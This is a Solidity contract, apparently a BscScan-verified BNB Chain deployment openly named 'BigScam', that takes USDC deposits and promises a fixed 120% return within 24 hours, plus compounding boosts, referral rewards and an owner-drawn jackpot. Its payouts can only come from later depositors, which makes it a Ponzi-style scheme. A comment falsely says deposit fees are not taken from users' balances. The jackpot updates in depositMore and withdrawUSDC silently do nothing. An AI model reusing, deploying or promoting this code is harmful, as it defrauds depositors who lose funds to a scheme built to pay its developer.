/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;

interface IBEP20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        _status = _NOT_ENTERED;
    }

    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == _ENTERED;
    }
}

contract BigScam is Ownable, ReentrancyGuard {
    using SafeMath for uint256;

    address public USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;

    address public devWallet = 0xe4E9DC903Cf9f4C938Ced5c6AA3EB25755063Bdc;

    mapping(address => uint256) public refBalance; // Tracking refferal balance

    uint256 totalDeposits = 0;
    uint256 totalWithdrawals = 0;

    struct Deposit {
        uint256 id;
        address owner;
        uint256 depositAmount;
        uint256 depositTime;
        uint256 finishTime;
    }

    uint256 public currentDepositID = 0;

    uint256 public ROI = 120; // 120% ROI fixed

    mapping(address => Deposit) public depositMapping;

    bool public topDepositJackpotEnabled = false;
    uint256 private topDepositTimer = 24 hours;

    uint256 public topDepositCurrentRound = 0;
    uint256 public topDepositCurrentPot = 0;
    address public topDepositCurrentLeader;
    uint256 public topDepositLeaderAmount = 0;
    uint256 public topDepositLastDraw = 0;
    uint256 public topDepositNextDraw = 0;

    bool public initialized = false;

    uint256 private depositDevFee = 8;      //
    uint256 private depositJackpotFee = 4;  //  NOT TAKEN FROM USERS BALANCE
    uint256 private depositTotalFee = 12;   //

    uint256 private withdrawalDevFee = 4;      //
    uint256 private withdrawalJackpotFee = 4;  // TAKEN FROM USERS BALANCE
    uint256 private withdrawalContractFee = 6; //
    uint256 private withdrawalTotalFee = 14;   //

    uint256 private refFee = 4;

    uint256 private compoundBoost = 5; // ADD 5% WHEN COMPOUNDING

    /// EVENTS ///////////////////////////////

    event protocolStart(uint256 when);

    event depositedUSDC(address who, uint256 amount, uint256 lockTimer);

    event TopDepositDrawn(address winner, uint256 amount);

    event compoundedUSDC(address who, uint256 previousAmount, uint256 newAmount);

    event depositedMore(address who, uint256 previousDeposit, uint256 newDeposit);

    event withdrewUSDC(address who, uint256 amount);


    //////////////////////////////////////////

    function startJackpot() internal {
        require(topDepositJackpotEnabled == false, "Already enabled.");

        topDepositJackpotEnabled = true;
        topDepositCurrentRound = 1; // First round
        topDepositCurrentPot = 1 * 10**18; // 1 USDC Starting Pot
        topDepositCurrentLeader = 0xD7Ced3bD37D3Db19eBe50dfCA6e3ae001D0561d0; // Temporary Dev Address
        topDepositLeaderAmount = 1 * 10**18; // Temporary amount;
        topDepositLastDraw = block.timestamp; // Set Last draw to now
        topDepositNextDraw = block.timestamp + 86400; // Set next draw to now + 24 hours

    }

    function drawTopDepositJackpot() public onlyOwner {
        require(topDepositJackpotEnabled, "Jackpot not enabled yet.");
        require(block.timestamp >= topDepositNextDraw, "Not finished.");

        address whoWon = topDepositCurrentLeader;
        uint256 amountWon = topDepositCurrentPot;

        require(whoWon != address(0), "Zero address.");

        IBEP20(USDC).transfer(whoWon, amountWon);

        topDepositCurrentRound++; // First round
        topDepositCurrentPot = 1 * 10**18; // 1 USDC Starting Pot
        topDepositCurrentLeader = 0xD7Ced3bD37D3Db19eBe50dfCA6e3ae001D0561d0; // Temporary Dev Address
        topDepositLeaderAmount = 1 * 10**18; // Temporary amount;
        topDepositLastDraw = block.timestamp; // Set Last draw to now
        topDepositNextDraw = block.timestamp + 86400; // Set next draw to now + 24 hours

        emit TopDepositDrawn(whoWon, amountWon);
    }

    function openProtocol() public onlyOwner {
        require(!initialized, "Already started.");
        startJackpot();
        initialized = true;

        emit protocolStart(block.timestamp);
    }

    function depositUSDC(uint256 amount, address ref) public {
        require(amount >= 100 * 10**18, "Minimum deposit 100 USDC.");
        require(amount <= 100000 * 10**18, "Maximum deposit 100K USDC.");
        require(initialized, "Not ready yet.");
        require(ref != address(0), "Zero address.");
        require(activeDepositBool(msg.sender) == false, "Deposit active.");
        require(depositMapping[msg.sender].depositAmount < 100 * 10**18, "Use depositMore function.");
        require(ref != msg.sender, "Cant refer yourself.");

        uint256 forDev = (amount.div(100)).mul(depositDevFee);
        uint256 forJackpot = (amount.div(100)).mul(depositJackpotFee);
        uint256 forRef = (amount.div(100)).mul(refFee);

        IBEP20(USDC).transferFrom(msg.sender, address(this), amount); // Take funds from user
        
        IBEP20(USDC).transfer(devWallet, forDev); // Dev tax

        topDepositCurrentPot += forJackpot; // Add to the pot

        if(amount > topDepositLeaderAmount) { // check if biggest deposit
            topDepositCurrentLeader = msg.sender;
            topDepositLeaderAmount = amount;
        }

        refBalance[ref] = refBalance[ref].add(forRef); // Add refferal reward

        depositMapping[msg.sender].id = currentDepositID + 1;
        currentDepositID++;
        depositMapping[msg.sender].owner = msg.sender;
        depositMapping[msg.sender].depositAmount = depositMapping[msg.sender].depositAmount.add(amount);
        depositMapping[msg.sender].depositTime = block.timestamp;
        depositMapping[msg.sender].finishTime = block.timestamp + 86400;

        totalDeposits += amount;

        emit depositedUSDC(msg.sender, amount, block.timestamp + 86400);
    }

    function compoundUSDC() public {
        require(activeDepositBool(msg.sender) == false, "Deposit active.");
        require(calculateROI(msg.sender) > 0, "No rewards.");

        uint256 currentDeposit = depositMapping[msg.sender].depositAmount;

        uint256 availableToClaim = calculateROI(msg.sender);

        uint256 boostedAmount = availableToClaim + (availableToClaim.div(100)).mul(compoundBoost);

        depositMapping[msg.sender].depositTime = block.timestamp;
        depositMapping[msg.sender].finishTime = block.timestamp + 86400;
        depositMapping[msg.sender].depositAmount = boostedAmount;

        emit compoundedUSDC(msg.sender, currentDeposit, boostedAmount);
    }

    function depositMore(uint256 amount, address ref) public {
        require(amount >= 100 * 10**18, "Minimum deposit 100 USDC.");
        require(amount <= 100000 * 10**18, "Maximum deposit 100K USDC.");
        require(initialized, "Not ready yet.");
        require(activeDepositBool(msg.sender) == false, "Deposit active.");
        require(calculateROI(msg.sender) > 0, "No rewards.");
        require(ref != msg.sender, "Cant refer yourself.");

        uint256 forDev = (amount.div(100)).mul(depositDevFee);
        uint256 forJackpot = (amount.div(100)).mul(depositJackpotFee);
        uint256 forRef = (amount.div(100)).mul(refFee);

        IBEP20(USDC).transferFrom(msg.sender, address(this), amount); // Take funds from user
        
        IBEP20(USDC).transfer(devWallet, forDev); // Dev tax

        topDepositCurrentPot.add(forJackpot); // Add to the pot

        if(amount > topDepositLeaderAmount) { // check if biggest deposit
            topDepositCurrentLeader = msg.sender;
            topDepositLeaderAmount = amount;
        }

        refBalance[ref] = refBalance[ref].add(forRef); // Add refferal reward

        uint256 currentDeposit = depositMapping[msg.sender].depositAmount;

        uint256 availableToClaim = calculateROI(msg.sender);

        uint256 boost = (availableToClaim.div(100)).mul(compoundBoost);

        uint256 boostedAmount = availableToClaim + boost + amount;

        depositMapping[msg.sender].depositTime = block.timestamp;
        depositMapping[msg.sender].finishTime = block.timestamp + 86400;
        depositMapping[msg.sender].depositAmount = boostedAmount;

        totalDeposits += amount;

        emit depositedMore(msg.sender, currentDeposit, boostedAmount);
    }

    function withdrawUSDC() public {
        require(activeDepositBool(msg.sender) == false, "Deposit active.");
        require(calculateROI(msg.sender) > 0, "No rewards.");

        uint256 amountToWithdraw = calculateROI(msg.sender);

        uint256 devTax = (amountToWithdraw.div(100)).mul(withdrawalDevFee);
        uint256 jackpotTax = (amountToWithdraw.div(100)).mul(withdrawalJackpotFee);
        uint256 contractTax = (amountToWithdraw.div(100)).mul(withdrawalContractFee);

        uint256 totalTax = devTax + jackpotTax + contractTax;

        uint256 withdrawalAfterTaxes = amountToWithdraw - totalTax;

        depositMapping[msg.sender].depositAmount = 0;
        depositMapping[msg.sender].depositTime = 0;
        depositMapping[msg.sender].finishTime = 0;

        topDepositCurrentPot.add(jackpotTax);

        IBEP20(USDC).transfer(devWallet, devTax);

        IBEP20(USDC).transfer(msg.sender, withdrawalAfterTaxes);

        totalWithdrawals += withdrawalAfterTaxes;

        emit withdrewUSDC(msg.sender, withdrawalAfterTaxes);
    }


    function activeDepositBool(address addr) public view returns (bool) {
        if(depositMapping[addr].id == 0 || depositMapping[addr].owner == address(0) || depositMapping[addr].depositAmount == 0) { return false; }

        if(block.timestamp >= depositMapping[addr].finishTime) { return false; }

        return true;
    }

    function calculateROI(address addr) public view returns (uint256) {
        if(depositMapping[addr].id == 0 || depositMapping[addr].owner == address(0) || depositMapping[addr].depositAmount == 0) { return 0; }

        if(block.timestamp >= depositMapping[addr].finishTime) {
            uint256 _depositAmount = depositMapping[addr].depositAmount;
            uint256 depositAfterROI = (_depositAmount.div(100)).mul(ROI);

            return depositAfterROI;
        }

        return 0;
    }

    function claimRefferals() public {
        require(refBalance[msg.sender] > 10 * 10**18, "Too small to claim.");

        uint256 amountToClaim = refBalance[msg.sender];

        refBalance[msg.sender] = 0;

        IBEP20(USDC).transfer(msg.sender, amountToClaim);
    }

    ///////// VIEW FUNCTIONS ////////////////

    function viewTVL() public view returns (uint256) {
        return IBEP20(USDC).balanceOf(address(this));
    }

    function viewUserDepositAmount(address addr) public view returns (uint256) {
        return depositMapping[addr].depositAmount;
    }

    function viewUserClaimableRewards(address addr) public view returns (uint256) {
        return calculateROI(addr);
    }

    function viewUserDepoStart(address addr) public view returns (uint256) {
        return depositMapping[addr].depositTime;
    }

    function viewUserDepoEnd(address addr) public view returns (uint256) {
        return depositMapping[addr].finishTime;
    }

    function viewUserActiveBool(address addr) public view returns (bool) {
        return activeDepositBool(addr);
    }

    function viewUserPendingRefferals(address addr) public view returns (uint256) {
        return refBalance[addr];
    }

    function checkCurrentPotRound() public view returns (uint256) {
        return topDepositCurrentRound;
    }

    function checkCurrentPotAmount() public view returns (uint256) {
        return topDepositCurrentPot;
    }

    function checkCurrentPotLeader() public view returns (address) {
        return topDepositCurrentLeader;
    }

    function checkCurrentLeaderAmount() public view returns (uint256) {
        return topDepositLeaderAmount;
    }

    function checkCurrentDepositID() public view returns (uint256) {
        return currentDepositID;
    }

    function checkCurrentJackpotID() public view returns (uint256) {
        return topDepositCurrentRound;
    }

    function checkNextJackpotDraw() public view returns (uint256) {
        return topDepositNextDraw;
    }

    function checkTotalDeposits() public view returns (uint256) {
        return totalDeposits;
    }

    function checkTotalWithdrawals() public view returns (uint256) {
        return totalWithdrawals;
    }

}